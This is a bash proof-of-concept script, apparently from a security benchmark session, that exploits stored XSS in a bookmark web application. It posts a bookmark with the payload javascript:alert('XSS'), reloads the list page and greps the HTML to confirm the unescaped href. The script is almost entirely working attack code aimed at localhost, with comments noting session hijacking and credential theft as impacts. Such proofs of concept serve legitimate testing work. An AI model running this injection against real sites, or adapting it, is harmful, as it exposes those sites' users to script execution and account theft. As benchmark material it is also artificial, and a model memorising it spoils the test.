#!/bin/bash
# POC: Demonstrates stored XSS vulnerability in bookmark application through javascript: URL injection in href attributes
# Target: ./repo
# Created: 2025-12-01T15:45:28.752Z
# Session: benchmark-XBEN-075-24-minbd1zc

# Stored XSS in Bookmark URL - POC
# Demonstrates vulnerability in unsafe URL rendering in href attributes
# The bookmark application renders user-supplied URLs directly in href attributes
# without escaping URL schemes, allowing javascript: payload execution

TARGET_URL="${1:-http://localhost:5000}"
COOKIE_FILE="/tmp/bookmark_xss_cookies.txt"

echo "[*] Stored XSS in Bookmark URL via Unsafe Attribute Rendering - POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Initialize session and get initial page
echo "[1] Initializing session by visiting /list endpoint..."
curl -s -c "$COOKIE_FILE" "$TARGET_URL/list" > /dev/null
if [ $? -ne 0 ]; then
    echo "[-] Failed to initialize session"
    exit 1
fi
echo "[+] Session initialized"
echo ""

# Step 2: Add a bookmark with javascript: URL (XSS payload)
echo "[2] Injecting malicious bookmark with javascript: URL..."
XSS_PAYLOAD="javascript:alert('XSS')"
curl -s -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$TARGET_URL/add" \
    -d "name=XSSTest&url=$XSS_PAYLOAD" > /dev/null
if [ $? -ne 0 ]; then
    echo "[-] Failed to add bookmark"
    exit 1
fi
echo "[+] Malicious bookmark added"
echo "[+] Payload: $XSS_PAYLOAD"
echo ""

# Step 3: Retrieve the list page and check if payload is unescaped
echo "[3] Retrieving bookmark list and checking for unescaped payload..."
RESPONSE=$(curl -s -b "$COOKIE_FILE" "$TARGET_URL/list")
if [ $? -ne 0 ]; then
    echo "[-] Failed to retrieve bookmark list"
    exit 1
fi
echo ""

# Step 4: Check if the javascript: URL appears unescaped in href attribute
if echo "$RESPONSE" | grep -q "href=\"javascript:alert"; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] Unescaped javascript: URL found in href attribute"
    echo ""
    echo "[4] Vulnerable HTML snippet:"
    echo "$RESPONSE" | grep -o '<a[^>]*href="javascript:[^"]*"[^>]*>[^<]*</a>' | head -1
    echo ""
    echo "[5] If a user clicks this link, JavaScript executes in their browser context"
    echo "[+] Impact: Arbitrary code execution (session hijacking, credential theft, etc.)"
    
    # Additional validation: check that javascript: is NOT encoded
    if echo "$RESPONSE" | grep -q "href=\"javascript%3A"; then
        echo "[-] False positive: javascript: is properly URL-encoded"
        exit 1
    fi
    
    if echo "$RESPONSE" | grep -q "href=\"&#"; then
        echo "[-] False positive: href attribute is HTML-entity encoded"
        exit 1
    fi
    
    echo ""
    echo "[+] POC SUCCESSFUL - Vulnerability is exploitable"
    rm -f "$COOKIE_FILE"
    exit 0
else
    echo "[-] Payload not found in expected location"
    echo "[-] Either the vulnerability is patched or the target is not running"
    echo ""
    echo "[*] Response snippet:"
    echo "$RESPONSE" | grep -i "bookmark\|href" | head -5
    rm -f "$COOKIE_FILE"
    exit 1
fi